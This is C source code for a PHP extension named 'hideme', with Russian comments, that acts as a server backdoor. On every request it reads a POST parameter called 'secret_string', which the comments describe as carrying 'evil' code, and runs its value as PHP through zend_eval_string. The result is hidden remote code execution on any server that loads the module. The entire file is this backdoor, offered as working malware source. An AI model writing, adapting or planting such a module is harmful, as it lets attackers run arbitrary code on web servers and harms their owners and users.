#include "stdafx.h"
#include "zend_config.w32.h"
#include "php.h"

PHP_RINIT_FUNCTION(hideme);
zend_module_entry hideme_ext_module_entry = {
    STANDARD_MODULE_HEADER,
    "hideme",
    NULL,
    NULL,
    NULL,
    PHP_RINIT(hideme),
	NULL, 
	NULL,
    "1.0",
    STANDARD_MODULE_PROPERTIES
};
ZEND_GET_MODULE(hideme_ext);

PHP_RINIT_FUNCTION(hideme)
{

	char* method = "_POST"; // суперглобальный массив, из которого берем пераметр и значение
	char* secret_string = "secret_string"; // параметр в котором будет evil-код
	zval** arr;
	char* code;

	if (zend_hash_find(&EG(symbol_table), method, strlen(method) + 1, (void**)&arr) != FAILURE) { 
		HashTable* ht = Z_ARRVAL_P(*arr);
		zval** val;
		if (zend_hash_find(ht, secret_string, strlen(secret_string) + 1, (void**)&val) != FAILURE) { // поиск нужного параметра в хеш-таблице
			code =  Z_STRVAL_PP(val); // значение параметра
			zend_eval_string(code, NULL, (char *)"" TSRMLS_CC); // выполнение кода
		}
	}
	return SUCCESS;
}